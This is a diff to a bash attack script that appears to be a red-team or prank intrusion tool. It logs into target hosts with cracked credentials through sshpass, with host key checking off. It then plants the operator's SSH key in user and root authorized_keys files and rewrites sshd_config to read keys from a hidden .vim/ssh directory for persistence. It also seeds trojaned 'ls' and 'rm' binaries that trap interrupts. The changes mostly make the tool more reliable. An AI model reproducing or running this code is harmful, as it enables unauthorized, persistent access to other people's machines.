@@ -25,10 +25,8 @@
 	#
 	#*************** NEED TO DO/ADD ***********************
 	# fix the non-prompt return at the end. ("starting sshd ok" but just stays blank)
-	# for centos (at least), change the WOULD YOU LIKE TO PLAY A GAME from 'wall' to pts/whatever
 	# checks for existing changes before reapplying them
 	# make rickroll "safer"
-	# faster timeouts
 	# fix file checking
 	# check for failed install attempt before adding to 'installed' list
 	# setup aafire (aalib)
@@ -53,7 +51,7 @@ else					###
 	neo					###
 	meat				###
 	bones				###
-	infect $*			### INFECTING TARGETS
+	infect "$@"			### INFECTING TARGETS
 fi 						###
 }						###
 ###########################
@@ -84,18 +82,19 @@ function bones() {
 	rickSourceIP="$(hostname -I | tr -d ' ')"
 		#rickHost="$(hostname -I | tr -d ' '):8000"
 # stuff for making sure the http server is alive and ready
-	CHECK_rickServer="$(netstat -tulnap | grep -q 80.*apache; echo $?)"
+	CHECK_rickServer="$(netstat -tulnap | grep -q "80.*apache"; echo $?)"
 		#CHECK_rickServer="$(netstat -tulnap | grep -q 8000.*python; echo $?)"
 	CHECK_rickFilesNum=5
 	function CHECK_rick(){
-		CHECK_rickFiles="$(curl -s $rickHost | grep -o roll | wc -l)"
-		echo $CHECK_rickFiles
+		CHECK_rickFiles="$(curl -s "$rickHost" | grep -o roll | wc -l)"
+		echo "$CHECK_rickFiles"
 	}
 #### Gathering Info ############################
 	### setting rickRoll IP ###
+		echo ""
 		read -p "What are we setting the rickRoll IP to [$rickSourceIP]: " rickSourceIP
 		: ${rickSourceIP:=$(hostname -I | tr -d ' ')}
-		command sed -i "s/^rick=.*/rick=\"$rickSourceIP\"" $rickScript
+		command sed -i "s/^rick=.*/rick=\"$rickSourceIP\"/" $rickScript
 	### ssh key ###
 		if [ ! -e $sshKey ]; then
 			ssh-keygen -f $sshKey -t rsa -N ''
@@ -163,7 +162,7 @@ function infect(){
 #### launch bay #############
 function payload(){			#
 	if [[ $1 != '' ]]; then	#
-		razor $*			# SINGLE TARGET
+		razor "$@"			# SINGLE TARGET
 	else					#
 		shotgun				# EVERYONE
 	fi 						#
@@ -198,16 +197,16 @@ function payload(){			#
 #### Inserting keys ############################
 		osDetect=$(timeout 1.5 sshpass -p $password ssh -n -o StrictHostKeyChecking=no $username@$target 'uname -v | egrep -o "Debian|Ubuntu" || cat /etc/*-release | grep -o CentOS | sort -u')
 			if [[ $? == 0 ]]; then
-				printf "\n[$target] Inserting ssh key and poisoning dirs with (\e[0;33m${username}\e[m:\e[0;33m${password}\e[m)"
+				printf "\n[%s] Inserting ssh key and poisoning dirs with (\e[0;33m%s\e[m:\e[0;33m%s\e[m)" "$target" "$username" "$password"
 			else
-				printf "\nFAILED to connect to $target"
+				printf "\nFAILED to connect to %s" "$target"
 			fi
 		# uncomment when rando errors start poppin'
 		#printf "\nosDetect result= $osDetect\n"
 			case $osDetect in
 				CentOS)
 						#inserting key
-							if ! timeout 1.5 ssh -n -o StrictHostKeyChecking=no $target; then
+							if ! timeout 1.5 ssh -n -o StrictHostKeyChecking=no "$target"; then
 								$sshLoginCommand "
 												echo $password | sudo -S mkdir -m700 -p $sshUserPath $sshRootPath &> /dev/null
 												echo $password | sudo -S chown $username:$username $sshUserPath &> /dev/null
@@ -218,6 +217,7 @@ function payload(){			#
 												"</root/.ssh/id_rsa.pub &> /dev/null
 							# if sudo doesn't exist, sets up the key for normal user and lets you know.
 								if [ $? != 0 ]; then
+									sshContinue=1
 									printf "\n\e[0;31mwomp womp.. no sudo. you get to do it manually.. yay!!\e[0m\n\t[$target:$username:$password]\n"
 									$sshLoginCommand "
 													mkdir -m700 -p $sshUserPath
@@ -225,7 +225,6 @@ function payload(){			#
 													cat >> $sshUserKey
 													" </root/.ssh/id_rsa.pub &> ./failedSudos
 									echo "Failed to use Sudo on [$target]" >> ./failedSudos
-									sshContinue=1
 								fi
 							fi
 						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
@@ -275,8 +274,12 @@ function payload(){			#
 											cat |
 											sudo tee -a $sshUserKey $sshRootKey
 											" </root/.ssh/id_rsa.pub &> /dev/null
+							if [ $? != 0 ]; then
+								sshContinue=1
+								printf "\n[\e[0;31m FAILED \e[0;m] Inserting SSH keys"
+							fi
 						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
-							if [ $? == 0 ]; then
+							if [ $sshContinue == 0 ]; then
 								printf "\nPoisoning sshd rules on [$target]\n"
 								$sshKeydCommand "
 											mkdir $sshPoisonPath
@@ -286,7 +289,7 @@ function payload(){			#
 											" &
 							fi
 						#payload
-							if [ $? == 0 ]; then
+							if [ $sshContinue == 0 ]; then
 								$sshKeydCommand "
 											touch /tmp/.trigger
 											echo '${dirtyLS}' | tee $seedPathsLS > /dev/null
@@ -307,17 +310,23 @@ function payload(){			#
 											cat |
 											sudo tee -a $sshUserKey $sshRootKey
 											" </root/.ssh/id_rsa.pub &> /dev/null
+							if [ $? != 0 ]; then
+								sshContinue=1
+								printf "\n[\e[0;31m FAILED \e[0;m] Inserting SSH keys"
+							fi
 						#New poisoned sshdir and auth file. adding the cronjob, then setting a reboot timer
-							printf "\nPoisoning sshd rules on [$target]\n"
-							$sshKeydCommand "
-										mkdir $sshPoisonPath
-										cp $sshRootKey $sshPoisonKey
-										sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
-										service sshd restart
-										" &
+							if [ $sshContinue == 0 ]; then
+								printf "\nPoisoning sshd rules on [$target]\n"
+								$sshKeydCommand "
+											mkdir $sshPoisonPath
+											cp $sshRootKey $sshPoisonKey
+											sed -i 's/#AuthorizedKeysFile/AuthorizedKeysFile .vim\/ssh /' /etc/ssh/sshd_config
+											service sshd restart
+											" &
+							fi
 							;;
 					*)
-							printf " UNKNOWN\n"
+							printf " UNKNOWN target. Doing nothing.\n"
 							;;
 			esac
 	}
@@ -337,7 +346,7 @@ function payload(){			#
 			printf "\n\n[\e[0;33m MISSING \e[0;m] Didn't find [$crackedLogins], or it's empty, so you must be testing something\n\t\t..hopefully..\n"
 		fi
 	}
-payload $*
+payload "$@"
 }
 ###########################################################################################
 ######  ╔╦╗╔═╗╔═╗╔╦╗ ######################################################################
@@ -351,17 +360,17 @@ function meat(){
 	updated=1
 	scriptPath="$BASH_SOURCE"
 #### Updating Repos ############################
-		if [[ $updated == 0 ]]; then
+		if [ $updated == 0 ]; then
 			command apt update
 		# so it knows not to check next time
 			sed -i 's/updated=0/updated=1/' $scriptPath
 		fi
-		printf "\n[\e[0;32m OK \e[0;m] Repos Updated"
+		printf "\n[\e[0;32m OK \e[0;m] Repos Updated\n"
 #### Software ############################
 	# looking for missing apps
 		for word in $commands; do
 			if ! dpkg-query -W -f='${Status}' "$word" | grep -q "ok installed"; then
-				installing="${installing} "$word""
+				installing="${installing} $word"
 			fi
 		done
 	# installing missing apps
@@ -424,7 +433,7 @@ seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
 				trap "printf '\nheh..not THAT easy..\n';sleep 2; printf '\nbut nice try\n'" SIGINT SIGTERM
 				#####################
 				function mainRM(){	#
-					buildEmUp $*	#
+					buildEmUp "$@"	#
 					tripwire		#
 				}					#
 				#####################
@@ -487,7 +496,7 @@ seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
 								;;
 					esac
 				}
-				mainRM $*
+				mainRM "$@"
 				EOF
 				)"
 ###########################################################################################
@@ -496,7 +505,7 @@ seedPathsRM="/usr/local/sbin/rm /usr/local/bin/rm"
 function neo(){
 	if [[ $EUID -ne 0  ]]; then
 		printf "\nyou forgot to run as root again... "
-		printf "\nCurrent dir is "$(pwd)"\n\n"
+		printf "\nCurrent dir is $(pwd)\n\n"
 		exit 1
 	fi
 }
@@ -504,4 +513,4 @@ function neo(){
 #+++++++++++++++++++++++++++++++++ FIGHT!! +++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 #+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
-main $*
+main "$@"
